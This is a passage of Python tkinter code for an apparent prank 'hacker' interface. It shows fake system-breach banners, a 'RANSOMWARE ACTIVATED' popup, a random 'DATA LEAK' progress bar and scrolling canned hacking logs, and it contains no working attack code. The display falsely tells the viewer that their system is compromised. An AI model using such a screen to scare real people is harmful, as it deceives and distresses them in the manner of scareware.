        right = tk.Frame(self.pane, bg='#000')
        self.pane.add(right, width=650)
        
        h = tk.Frame(right, bg='#300', bd=2, relief=tk.RAISED)
        h.pack(fill=tk.X, padx=5, pady=5)
        self.title = tk.Label(h, text="⚠️ SYSTEM BREACH ⚠️", font=self.bfont, fg='#f00', bg='#300')
        self.title.pack(pady=10)
        tk.Label(h, text="UNAUTHORIZED ACCESS DETECTED", font=self.hfont, fg='#f44', bg='#300').pack()
        
        self.mcanvas = tk.Canvas(right, height=60, bg='#000', highlightthickness=0)
        self.mcanvas.pack(fill=tk.X, padx=5, pady=5)
        
        sf = tk.Frame(right, bg='#010', bd=1, relief=tk.SUNKEN)
        sf.pack(fill=tk.X, padx=5, pady=5)
        self.sys_stat = tk.Label(sf, text="SYSTEM: COMPROMISED | FIREWALL: OFF",
                                  font=self.hfont, fg='#0f0', bg='#010')
        self.sys_stat.pack(pady=5)
        
        self.pcanvas = tk.Canvas(right, height=25, bg='#010', highlightthickness=0)
        self.pcanvas.pack(fill=tk.X, padx=5, pady=5)
        
        self.log = scrolledtext.ScrolledText(right, height=15, font=self.cfont,
                                              bg='#000', fg='#0f0', bd=2, relief=tk.SUNKEN)
        self.log.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.bstat = tk.Label(right, text="⚠️ CRITICAL FAILURE ⚠️",
                               font=self.hfont, fg='#f00', bg='#000')
        self.bstat.pack(fill=tk.X, padx=5, pady=(0,5))
    
    def on_key(self, event):
        if event.char.isprintable():
            if check_escape(event.char, self.root):
                return
            self.log.insert(tk.END, f"[KEY] {event.char}\n")
            self.log.see(tk.END)
    
    def show_popup(self):
        if escape_triggered:
            return
        self.scan_label.destroy()
        self.popup = HackerPopup(self.root)
        self.popup.create()
        self.log.insert(tk.END, "\n[!!!] RANSOMWARE ACTIVATED!\n")
        self.log.see(tk.END)
    
    def update_terminal(self):
        if escape_triggered:
            return
        if self.ci < len(terminal_commands):
            self.term.insert(tk.END, f"root@kali:~# {terminal_commands[self.ci]}\n[*] Executing...\n[+] Done\n\n")
            self.term.see(tk.END)
            self.ci += 1
        else:
            self.ci = 0
            self.term.delete(1.0, tk.END)
        self.root.after(3000, self.update_terminal)
    
    def anim_header(self):
        if escape_triggered:
            return
        if not hasattr(self, 'hi'):
            self.hi = 0
        self.title.config(text=["⚠️ SYSTEM BREACH ⚠️", "💀 ROOT ACCESS 💀", "🔓 NO SECURITY 🔓"][self.hi % 3])
        self.hi += 1
        self.root.after(800, self.anim_header)
    
    def anim_progress(self):
        if escape_triggered:
            return
        self.pcanvas.delete("all")
        self.progress += self.pdir * random.randint(2, 5)
        if self.progress >= 100: self.progress, self.pdir = 100, -1
        elif self.progress <= 0: self.progress, self.pdir = 0, 1
        w = self.pcanvas.winfo_width()
        if w > 0:
            fw = int(w * self.progress / 100)
            c = '#0f0' if self.progress < 30 else '#ff0' if self.progress < 70 else '#f00'
            self.pcanvas.create_rectangle(0, 0, fw, 25, fill=c)
            self.pcanvas.create_text(w//2, 12, text=f"DATA LEAK: {self.progress}%",
                                     fill='white', font=self.hfont)
        self.root.after(100, self.anim_progress)
    
    def update_logs(self):
        if escape_triggered:
            return
        ts = datetime.now().strftime("%H:%M:%S")
        self.log.insert(tk.END, f"[{ts}] {random.choice(hacking_messages)}\n")
        if int(self.log.index('end-1c').split('.')[0]) > 300:
            self.log.delete('1.0', '50.0')
        self.log.see(tk.END)
        self.root.after(random.randint(500, 1500), self.update_logs)
    
    def update_status(self):
        if escape_triggered:
            return
        self.sys_stat.config(text=random.choice(["SYSTEM: COMPROMISED | FW: OFF", "ENCRYPTION: BROKEN | BD: ACTIVE"]))
        self.root.after(4000, self.update_status)
    
    def update_scripts(self):
        if escape_triggered:
            return
        scr = hacker_scripts[self.si % len(hacker_scripts)]
        lines = scr.split('\n')
        if self.sl < len(lines):
            line = lines[self.sl]
            self.script.insert(tk.END, line + '\n')
            if '#' in line: self.script.tag_add('comment', "end-2l", "end-1l")
            self.script.see(tk.END)
            self.sl += 1
        else:
            self.si += 1
            self.sl = 0
            self.script.insert(tk.END, "\n" + "="*40 + "\n\n")
            self.script.see(tk.END)
        self.root.after(random.randint(50, 150), self.update_scripts)
    
    def matrix(self):
        if escape_triggered:
            return
        self.mcanvas.delete("all")
        w = self.mcanvas.winfo_width()
        if w > 0:
            for i in range(0, w, 12):
                self.mcanvas.create_text(i, random.randint(5, 55), text=random.choice("01"),
                                         fill=random.choice(['#0f0', '#3f3', '#6f6']), font=self.cfont)
        self.root.after(100, self.matrix)
    
    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    try:
        app = HackerInterface()
        app.run()
    except KeyboardInterrupt:
        print("\nQuit.")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        sys.exit(0)